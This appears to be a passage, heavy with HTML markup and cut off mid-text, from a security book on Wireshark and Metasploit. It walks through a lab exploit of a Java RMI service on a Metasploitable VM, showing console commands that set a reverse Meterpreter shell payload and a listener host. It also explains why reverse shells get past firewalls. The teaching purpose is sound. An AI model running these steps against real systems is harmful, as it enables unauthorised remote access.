New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >http://192.168.56.106:8080/</span></u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sLaVQ2sPK/kT.jar</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:36.9500pt;margin-left:15.1500pt;text-indent:-7.2000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*]</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >192.168.56.103</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >java_rmi_server - Replied to request</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for payload</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >JAR</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[+] Target 192.168.56.103:1099 may be exploitable&#8230; [*] Server stopped.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:10.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you go to Wireshark and use the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tcp.port == 4444</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >filter, you will see that the attacker machine is continually sending </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SYN </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packets without</span><span><a href="#_bookmark508" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&nbsp;receiving an </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ACK</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >back from the Metasploitable VM, as shown in </span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >6-15</span></u><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section261" ><p class=MsoBodyText ><img width="780"  height="245"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker335147.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark508" ></a><span><a href="#_bookmark507" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 6-15:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Unanswered SYNs</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:5.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A firewall that silently drops packets is usually the worst-case scenario. You will also encounter situations where the firewall responds with an </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RST </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packet. <a name="_bookmark509" ></a>This makes your life easier, as it is immediately obvious that you have a firewall blocking your port.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:14.8000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >TCP Stream Showing a Reverse Shell</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the previous section, we showed a bind shell, where the exploit started a new service on the victim. You connected to that new service to get the shell session. The reverse shell is aptly named, because it does the same, but in reverse. For the reverse shell session to work, you must first start a listener on your (attacker&#8217;s) system, and then instruct the victim system to connect back to your system. Then the shell can be used. We see all this happening, thanks to Wireshark, in this section.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In this section, we will use a different payload, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >java/meterpreter/reverse_tcp</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Notice the name includes the word </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >reverse</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. This tell you that this payload acts differently from payloads used previously. Instead of creating a service that listens on the victim machine, this payload instructs the victim to initiate a connection back to the Metasploit Framework. (Prior to executing the exploit, you must first set up a </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >listener </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >on the Metasploit Framework.) In other words, it works in reverse.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Do you already recognize why a connection initiated from the victim is useful? A payload for a reverse shell is useful for bypassing normal firewall configurations that typically block inbound connection</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section262" ><p class=MsoBodyText  style="margin-top:3.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >attempts, but not outbound.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >How exactly is this done? The Metasploit Framework creates an additional service on a specified port. That additional service reaches out and connects to the attacker machine. To make this happen, you will need to configure that port, plus a few other options.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >From the previous section, our Metasploit console prompt shows we already have the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >exploit/multi/misc/java_rmi_server</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >module loaded. The </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RHOST </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option is still set to the vulnerable Metasploitable machine, which at the time of this writing was IP address </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >192.168.56.103</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. If this is not the case for you now, please load that exploit module and set the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >RHOST</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next step is to set the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >option. Multiple </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >options exist for the exploit module, so let&#8217;s start with typing </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SET PAYLOAD</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and press Tab to see the additional options. The screen output will appear like this:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf exploit(java_rmi_server) &#62; set PAYLOAD</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:80.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >generic/custom</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD java/meterpreter/reverse_http</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >set PAYLOAD java/shell/reverse_tcp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:80.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >generic/shell_bind_tcp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD java/meterpreter/reverse_https</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >set PAYLOAD java/shell_reverse_tcp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:80.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >generic/shell_reverse_tcp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD java/meterpreter/reverse_tcp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:80.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >java/meterpreter/bind_tcp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >set</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD java/shell/bind_tcp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark510" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Select </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >java/meterpreter/reverse_tcp</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, and then verify the required options are set. Your screen output should resemble the following:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.3500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark511" ></a><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf exploit(java_rmi_server) &#62; set PAYLOAD java/meterpreter/reverse_tcp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PAYLOAD =&#62; java/meterpreter/reverse_tcp</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf exploit(java_rmi_server) &#62; set LHOST 192.168.56.106 LHOST =&#62; 192.168.56.106</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf exploit(java_rmi_server) &#62; show options</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:101.7000pt;margin-left:29.5500pt;text-indent:-21.6000pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >Module options</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;letter-spacing:-2.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >(exploit/multi/misc/java_rmi_server): Name</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >Current</span><span style="mso-spacerun:'yes';font-family:'Courier 